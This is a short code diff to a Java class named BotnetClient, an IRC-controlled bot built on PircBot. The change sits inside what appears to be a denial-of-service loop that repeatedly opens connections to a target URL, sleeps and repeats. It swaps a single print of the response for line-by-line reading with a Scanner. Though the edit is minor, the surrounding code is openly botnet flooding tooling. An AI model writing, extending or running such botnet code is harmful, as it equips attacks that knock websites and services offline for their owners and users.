@@ -151,7 +151,10 @@ public class BotnetClient extends PircBot {
 			while (!terminate && performed < times) {
 				try {
 					URLConnection connect = url.openConnection();
-					System.out.println(connect.getContent());
+					Scanner in = new Scanner(new BufferedReader(new InputStreamReader(connect.getInputStream())));
+					while (in.hasNextLine()) {
+						System.out.println(in.nextLine());
+					}
 					DdosThread.sleep(sleeptime);
 				} catch (InterruptedException e) {
 					System.out.println(e.getMessage());
